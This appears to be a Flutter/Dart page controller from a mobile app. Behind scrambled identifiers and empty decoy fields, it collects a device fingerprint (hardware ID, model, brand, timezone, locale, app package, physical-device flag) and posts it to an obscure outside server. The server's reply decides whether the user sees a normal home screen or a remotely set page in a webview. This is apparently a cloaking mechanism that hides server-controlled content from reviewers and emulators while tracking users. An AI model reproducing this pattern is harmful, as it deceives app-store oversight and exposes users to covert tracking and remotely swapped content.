import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var ljakihxcwm = RxBool(false);
  var jctxwofpq = RxBool(true);
  var bsqfdc = RxString("");
  var meggie = RxBool(false);
  var dubuque = RxBool(true);
  final irbcyjsdz = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    xquryz();
  }


  Future<void> xquryz() async {

    meggie.value = true;
    dubuque.value = true;
    jctxwofpq.value = false;

    irbcyjsdz.post("https://sor.pabase.xyz/ScmzF3ajGhxNa",data: await ozfsywj()).then((value) {
      var qlenop = value.data["qlenop"] as String;
      var trjo = value.data["trjo"] as bool;
      if (trjo) {
        bsqfdc.value = qlenop;
        deanna();
      } else {
        hauck();
      }
    }).catchError((e) {
      jctxwofpq.value = true;
      dubuque.value = true;
      meggie.value = false;
    });
  }

  Future<Map<String, dynamic>> ozfsywj() async {
    final DeviceInfoPlugin sobgzj = DeviceInfoPlugin();
    PackageInfo nbhta_qczlxw = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var hovc = Platform.localeName;
    var KWvABHzt = currentTimeZone;

    var qYRSrb = nbhta_qczlxw.packageName;
    var tNzPS = nbhta_qczlxw.version;
    var ypAM = nbhta_qczlxw.buildNumber;

    var quGEaW = nbhta_qczlxw.appName;
    var adellVolkman = "";
    var moniqueDavis = "";
    var nvDxgfsu  = "";
    var jBRdmb = "";
    var tiaraLuettgen = "";
    var domenicShanahan = "";
    var elisabethPagac = "";
    var quinnDicki = "";

    var ojGeunv = "";

    var lQmBYd = "";
    var SvUOR = false;

    if (GetPlatform.isAndroid) {
      lQmBYd = "android";
      var aqmktoxuy = await sobgzj.androidInfo;

      jBRdmb = aqmktoxuy.brand;

      ojGeunv  = aqmktoxuy.model;
      nvDxgfsu = aqmktoxuy.id;

      SvUOR = aqmktoxuy.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lQmBYd = "ios";
      var ujckxi = await sobgzj.iosInfo;
      jBRdmb = ujckxi.name;
      ojGeunv = ujckxi.model;

      nvDxgfsu = ujckxi.identifierForVendor ?? "";
      SvUOR  = ujckxi.isPhysicalDevice;
    }
    var res = {
      "ypAM": ypAM,
      "domenicShanahan" : domenicShanahan,
      "tNzPS": tNzPS,
      "ojGeunv": ojGeunv,
      "KWvABHzt": KWvABHzt,
      "jBRdmb": jBRdmb,
      "adellVolkman" : adellVolkman,
      "hovc": hovc,
      "qYRSrb": qYRSrb,
      "lQmBYd": lQmBYd,
      "SvUOR": SvUOR,
      "elisabethPagac" : elisabethPagac,
      "nvDxgfsu": nvDxgfsu,
      "moniqueDavis" : moniqueDavis,
      "quGEaW": quGEaW,
      "tiaraLuettgen" : tiaraLuettgen,
      "quinnDicki" : quinnDicki,

    };
    return res;
  }

  Future<void> hauck() async {
    Get.offAllNamed("/homeTab");
  }

  Future<void> deanna() async {
    Get.offAllNamed("/homeCard");
  }

}
